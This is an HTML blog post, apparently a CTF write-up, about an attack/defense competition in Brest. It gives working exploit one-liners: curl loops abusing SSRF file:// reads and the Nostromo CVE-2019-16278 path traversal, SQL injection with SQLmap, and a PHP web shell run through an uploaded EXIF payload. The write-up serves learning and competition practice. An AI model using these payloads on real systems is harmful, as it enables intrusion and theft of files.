@@ -1,0 +1,364 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>UYBHYS - Sea Monster Attack & Defense CTF | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="UYBHYS - Sea Monster Attack &amp; Defense CTF" />
+  <meta name="description" content="Last week-end I teamed up with members from Aperikube for an Attack/Defense CTF which took place in Brest - France. In this &quot;small&quot; blog post I will write about this experience, the challenges and our…" />
+  <meta property="og:description" content="Last week-end I teamed up with members from Aperikube for an Attack/Defense CTF which took place in Brest - France. In this &quot;small&quot; blog post I will write about this experience, the challenges and our methodology :)![Banner]({{ site.baseurl }}/images/SeaMonster/SeaMonsterBanner.png &quot;Banner&quot;){: .cent…" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/seamonsterctf/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/seamonsterctf/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2019-06-22T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/SeaMonster/SeaMonsterBanner.png" />
+  <meta property="og:image:alt" content="UYBHYS - Sea Monster Attack &amp; Defense CTF" />
+  <meta property="og:image:width" content="883" />
+  <meta property="og:image:height" content="457" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">UYBHYS - Sea Monster Attack &amp; Defense CTF</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2019-06-22T00:00:00+00:00">2019-06-22</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H5M0S">5&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/SeaMonster/SeaMonsterBanner.png"
+      alt="UYBHYS - Sea Monster Attack &amp; Defense CTF"
+      width="883"
+      height="457"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#ctf-architecture">CTF Architecture</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#win-unlock-ctf">win.unlock.ctf</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#rdp-3389">RDP - 3389</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#plc-unlock-ctf">plc.unlock.ctf</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#modbus-502">Modbus - 502</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#bastion-unlock-ctf">bastion.unlock.ctf</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#ssrf-port-8080">SSRF - Port 8080</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#www-unlock-ctf">www.unlock.ctf</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#nostromo-port-3232">Nostromo - Port 3232</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#custom-website-port-80">Custom website - Port 80</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/seamonsterctf/#final-thought">Final Thought</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>Last week-end I teamed up with members from <a href="https://www.aperikube.fr">Aperikube</a> for an Attack/Defense CTF which took place in Brest - France. In this "small" blog post I will write about this experience, the challenges and our methodology :)</p>
+<p>![Banner]({{ site.baseurl }}/images/SeaMonster/SeaMonsterBanner.png "Banner"){: .center-image }</p>
+<span id="continue-reading"></span>
+<p>Rules &amp; informations about the CTF are available in the following PDF : [CTF_UYBHYS.pdf]({{ site.baseurl }}/files/CTF_UYBHYS.pdf)</p>
+<h2 id="ctf-architecture">CTF Architecture</h2>
+<p>All teams had the same virtual machines to secure and attack.</p>
+<ul>
+<li>bastion.unlock.ctf : 172.16.1.20</li>
+<li>www.unlock.ctf : 172.16.1.10</li>
+<li>plc.unlock.ctf : 192.168.12.10</li>
+<li>win.unlock.ctf : 192.168.0.10</li>
+<li>fw.unlock.ctf (PfSense)</li>
+</ul>
+<p>These machines host some services such as Web Servers, RDP etc... We had access to the source code of the binaries and the URL alive.unlock.ctf displayed the status of all teams services. In the following picture you can clearly see Team08 and Team10 didn't patch their RDP.</p>
+<p>![Alive]({{ site.baseurl }}/images/SeaMonster/SeaMonsterAlive.png "Alive services"){: .center-image }</p>
+<p>In the first 30 minutes we could access our machines and secure them without losing any points, then the scoreboard will update every 20 seconds to decrease your point if a service is down, you also loose point when a team is stealing one of your flag. Based on what we had we mapped the services linked to a flag and 2 columns to check if they were patched and/or exploited.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>PORT      STATE    SERVICE       REASON         VERSION                             PATCHED     EXPLOIT
+</span><span style="color:#d08770;">53</span><span>                               Bastion        bind                                OK          OK       SSRF/zone
+</span><span style="color:#d08770;">25</span><span>/tcp                           PLC            vplc ESMTP Postfix (Debian/GNU)     OK     
+</span><span style="color:#d08770;">80</span><span>/tcp    open     http          Web            nginx </span><span style="color:#d08770;">1</span><span>.</span><span style="color:#d08770;">6</span><span>.</span><span style="color:#d08770;">2</span><span>                         OK          OK       sql    TODO RCE
+</span><span style="color:#d08770;">502</span><span>/tcp   open     modbus        PLC            Modbus TCP                          OK          OK       Modbus    
+</span><span style="color:#d08770;">3232</span><span>/tcp  open     http          Web            nostromo </span><span style="color:#d08770;">1</span><span>.</span><span style="color:#d08770;">9</span><span>.</span><span style="color:#d08770;">6</span><span>                      OK          OK       DirTravRCE        
+</span><span style="color:#d08770;">3389</span><span>/tcp  filtered ms-wbt-server Win                                                     
+</span><span style="color:#d08770;">4141</span><span>/tcp  open     oirtgsvc?     Bastion        whoareyou                           OK                   BOF ? 
+</span><span style="color:#d08770;">4242</span><span>                             Bastion                                            OK              
+</span><span style="color:#d08770;">8080</span><span>/tcp  open     http          Bastion        Apache httpd </span><span style="color:#d08770;">2</span><span>.</span><span style="color:#d08770;">4</span><span>.</span><span style="color:#d08770;">10</span><span> ((Debian))      OK          KO       MySQL ?
+</span><span style="color:#d08770;">9090</span><span>/tcp  open     http          Web            nginx </span><span style="color:#d08770;">1</span><span>.</span><span style="color:#d08770;">6</span><span>.</span><span style="color:#d08770;">2</span><span>                         OK          OK       LDAP inj
+</span><span style="color:#d08770;">45454</span><span>/tcp open     unknown       Bastion        exploit 
+</span></code></pre>
+<p>It was possible to trade some points for hints and insights in the Black Market, however nothing is guaranted: flags and hints might be wrong or misleading. We took the $0 trade, this gave us a list of the teams and their corresponding sea monster :</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>TEAM1-CRABAL
+</span><span>TEAM2-MEDUSA
+</span><span>TEAM3-STARKA
+</span><span>TEAM4-PIKOR
+</span><span>TEAM5-PONIK
+</span><span>TEAM6-BALENOR
+</span><span>TEAM7-KRAKEN
+</span><span>TEAM8-SQUIDO
+</span><span>TEAM9-HYDROL
+</span><span>TEAM10-SHARKY
+</span><span>TEAM11-POULPY
+</span><span>TEAM12-GUMPAL
+</span><span>TEAM12-SNAKUS
+</span><span>TEAM14-MORSOS
+</span><span>TEAM15-RAYMOL
+</span></code></pre>
+<h2 id="win-unlock-ctf">win.unlock.ctf</h2>
+<p>I wasn't paying attention when the organizers told us the account was not <code>user</code> as stated in the PDF but in fact <code>Administrator</code>. Missing this information, made me try to exploit the machine in order to get an NT AUTORITY SYSTEM shell, I went to the easy path <code>Eternal Blue</code>.</p>
+<p>![Windows Eternal Blue]({{ site.baseurl }}/images/SeaMonster/SeaMonsterWin.png "Windows Eternal Blue"){: .center-image }</p>
+<h3 id="rdp-3389">RDP - 3389</h3>
+<p>However the SMB service was not forwarded by the firewall and we couldn't exploit the service, it seems the intended way was to use <code>Bluekeep</code> as the RDP was checked by the bot and the team lose some points until we opened a Port Forward rule.</p>
+<p>![Firewall]({{ site.baseurl }}/images/SeaMonster/SeaMonsterFirewall.png "Firewall services"){: .center-image }</p>
+<h2 id="plc-unlock-ctf">plc.unlock.ctf</h2>
+<h3 id="modbus-502">Modbus - 502</h3>
+<p>This machine was an easy win, we used <a href="https://github.com/meeas/plcscan">plcscan</a> to scan the Modbus service on port 502, the PLC description contained the flag.</p>
+<p>![Modbus]({{ site.baseurl }}/images/SeaMonster/SeaMonsterModbusScan.png "Modbus services"){: .center-image }</p>
+<p>![PLC]({{ site.baseurl }}/images/SeaMonster/SeaMonsterPLC.png "PLC description"){: .center-image }</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#d08770;">team02</span><span>.</span><span style="color:#d08770;">ctf</span><span>:</span><span style="color:#d08770;">502</span><span> Modbus/TCP
+</span><span>  Unit ID: </span><span style="color:#d08770;">0
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{bda1c2b26927c2ac87e084fc5} 
+</span><span>  Unit ID: </span><span style="color:#d08770;">255
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{bda1c2b26927c2ac87e084fc5} 
+</span><span style="color:#d08770;">team03</span><span>.</span><span style="color:#d08770;">ctf</span><span>:</span><span style="color:#d08770;">502</span><span> Modbus/TCP
+</span><span>  Unit ID: </span><span style="color:#d08770;">0
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{7ec413a0d19bf0a59a95d8874} 
+</span><span>  Unit ID: </span><span style="color:#d08770;">255
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{7ec413a0d19bf0a59a95d8874} 
+</span><span>[...]
+</span><span style="color:#d08770;">team14</span><span>.</span><span style="color:#d08770;">ctf</span><span>:</span><span style="color:#d08770;">502</span><span> Modbus/TCP
+</span><span>  Unit ID: </span><span style="color:#d08770;">0
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{3e710c7179074e1a62be9de88} 
+</span><span>  Unit ID: </span><span style="color:#d08770;">255
+</span><span>    Device: diateam diateam virtual plc </span><span style="color:#d08770;">v42</span><span>.</span><span style="color:#d08770;">1337</span><span> UYB{3e710c7179074e1a62be9de88} 
+</span></code></pre>
+<h2 id="bastion-unlock-ctf">bastion.unlock.ctf</h2>
+<h3 id="ssrf-port-8080">SSRF - Port 8080</h3>
+<p>The web server on port 8080 allows the user to ping a machine, we runned the <code>grep</code> binary on the entire disk to find files containing flags and used the SSRF to display them with <code>http://team14.ctf:8080/index.php?ip=file://PATH_TO_FILE</code>.</p>
+<p>It appears we could read the file <code>file:///etc/bind/zones/unlock.ctf.db</code>, so we scripted the exploitation of this challenge, however this was the flag for the <code>Port 53</code>...</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#b48ead;">for</span><span> i </span><span style="color:#b48ead;">in </span><span>`</span><span style="color:#bf616a;">seq</span><span> 1 15`; </span><span style="color:#b48ead;">do </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Team</span><span>&quot;$</span><span style="color:#bf616a;">i</span><span>; </span><span style="color:#bf616a;">curl -s</span><span> http://team0$</span><span style="color:#bf616a;">i</span><span>.ctf:8080/index.php?ip=file%</span><span style="color:#d08770;">3</span><span>A%</span><span style="color:#d08770;">2</span><span>F%</span><span style="color:#d08770;">2</span><span>F%</span><span style="color:#d08770;">2</span><span>Fetc%</span><span style="color:#d08770;">2</span><span>Fbind%</span><span style="color:#d08770;">2</span><span>Fzones%</span><span style="color:#d08770;">2</span><span>Funlock.ctf.db | </span><span style="color:#bf616a;">grep</span><span> UYB; </span><span style="color:#b48ead;">done
+</span></code></pre>
+<p>![Bind]({{ site.baseurl }}/images/SeaMonster/SeaMonsterWWWssrfpath.png "Bind"){: .center-image }</p>
+<p>We made the mistake to assume a simple filter like <code>$ip[0] == "1"</code> would be enough to stop any exploitation on our machine, however we missed the critical point. Another service was available on port 6666, which would display the content of the file using a specificly crafted URL. We saw the exploit in our logs and replayed the URL on the other team to get more flags.</p>
+<h2 id="www-unlock-ctf">www.unlock.ctf</h2>
+<h3 id="nostromo-port-3232">Nostromo - Port 3232</h3>
+<p>We used the CVE-2019-16278 to exploit the Nostromo service on the web machine.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">$</span><span> for i in `</span><span style="color:#bf616a;">seq</span><span> 1 15`; </span><span style="color:#b48ead;">do </span><span style="color:#96b5b4;">echo </span><span style="color:#bf616a;">-n </span><span>&quot;</span><span style="color:#a3be8c;">Team</span><span>&quot;$</span><span style="color:#bf616a;">i</span><span>; </span><span style="color:#bf616a;">curl -s </span><span>&quot;</span><span style="color:#a3be8c;">http://team0</span><span>$</span><span style="color:#bf616a;">i</span><span style="color:#a3be8c;">.ctf:3232//.%0D./.%0D./.%0D./.%0D./var/nostromo/conf/flag.txt</span><span>&quot; | </span><span style="color:#bf616a;">grep</span><span> UYB; </span><span style="color:#b48ead;">done
+</span><span>
+</span><span style="color:#bf616a;">[...]
+</span><span style="color:#bf616a;">Team2</span><span> UYB{bcf13245517c9fb5158719cec}
+</span><span style="color:#bf616a;">Team3</span><span> UYB{b454ae20caa9b07ab4e2c3c01}
+</span><span style="color:#bf616a;">Team4</span><span> UYB{41c0136228d5a7db614f89431}
+</span><span style="color:#bf616a;">[...]
+</span></code></pre>
+<p>Our patch might have been the worst of all patch history, we made a copy a the current index page with <code>curl</code> and then replaced the nostromo service with a <code>python -m SimpleHTTPServer 3232</code>. Dirty but efficient !</p>
+<p>![Trade]({{ site.baseurl }}/images/SeaMonster/SeaMonsterTrade.jpg "Trade"){: .center-image }</p>
+<h3 id="custom-website-port-80">Custom website - Port 80</h3>
+<p>First part of the exploitation was to create an account to access the website and find the SQL injection. The exploitation doesn't need to be logged in, the flag was stored as a plaintext password for the administrator. <code>SQLmap</code> and simple <code>for</code> loop were enough to exploit the vulnerability and dump the users table.</p>
+<p>![SQL]({{ site.baseurl }}/images/SeaMonster/SeaMonsterSQL.png "SQL"){: .center-image }</p>
+<p>The website contains multiple vulnerabilities, once logged as admin we can access the upload page, even though the HTML upload part was commented.</p>
+<p>![UPLOAD]({{ site.baseurl }}/images/SeaMonster/SeaMonsterWWWuploadcode.png "upload"){: .center-image }</p>
+<p>The PHP backend is doing some checks but it is not enough to prevent the upload of a PHP file in the images directory, we used a payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20Metadata/PHP_exif_system.jpg">PayloadsAllTheThings</a> and then executed our commands with <code>http://team12.ctf/images_import/PHP_exif_system.php?c=whoami</code>. Unfortunately the CTF ended when we got our command exec... (otherwise we might have been able to exploit EternalBlue against the Windows machine and grab the flag located in C:\flag).</p>
+<p>Even if you had patched these vulnerabilities in the website, there were two backup folders <code>site.bak</code> and <code>site_save</code> to remove.</p>
+<p>![Backup]({{ site.baseurl }}/images/SeaMonster/SeaMonsterWWWtree.png "Backup"){: .center-image }</p>
+<h2 id="final-thought">Final Thought</h2>
+<p>The CTF was great, the infrastructure worked flawlessly and the challenge difficulty was balanced enough to let the team understand, patch and exploit them during the 5 hours timeframe. We finished 1st but I would like to thank all the teams for their fair-play and the organisers for the event. Also thank you to the different sponsors ;)</p>
+<p>![Scoreboard]({{ site.baseurl }}/images/SeaMonster/SeaMonsterScoreboard.jpg "Scoreboard"){: .center-image }</p>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>HIP19 Writeup - Meet Your Doctor 1,2,3</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/sigsegv-md-auth/" accesskey="."
+    ><span>SIGSEGV1 Writeup - MD Auth</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
